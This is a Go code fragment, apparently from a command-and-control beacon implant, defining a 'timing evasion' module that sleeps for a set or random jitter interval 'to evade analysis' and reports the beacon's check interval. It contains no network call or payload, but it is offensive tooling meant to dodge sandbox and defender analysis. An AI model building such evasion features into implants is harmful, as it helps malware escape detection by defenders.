// Timing Evasion module - Apply timing delays

func (b *GoBeacon) moduleTimingEvasion(parameters string) string {
	var result strings.Builder
	result.WriteString("=== TIMING EVASION ===\n")

	if parameters != "" {
		if sleepTime, err := strconv.Atoi(parameters); err == nil && sleepTime > 0 && sleepTime <= 300 {
			result.WriteString(fmt.Sprintf("Sleeping for %d seconds to evade analysis...\n", sleepTime))
			time.Sleep(time.Duration(sleepTime) * time.Second)
			result.WriteString("Sleep completed\n")
		} else {
			result.WriteString("Invalid sleep time (must be 1-300 seconds)\n")
		}
	} else {
		jitterSleep := rand.Intn(30) + 10
		result.WriteString(fmt.Sprintf("Applying random jitter delay: %d seconds\n", jitterSleep))
		time.Sleep(time.Duration(jitterSleep) * time.Second)
		result.WriteString("Jitter delay completed\n")
	}

	result.WriteString(fmt.Sprintf("Current beacon check interval: %v\n", b.CheckInterval))

	return result.String()
}
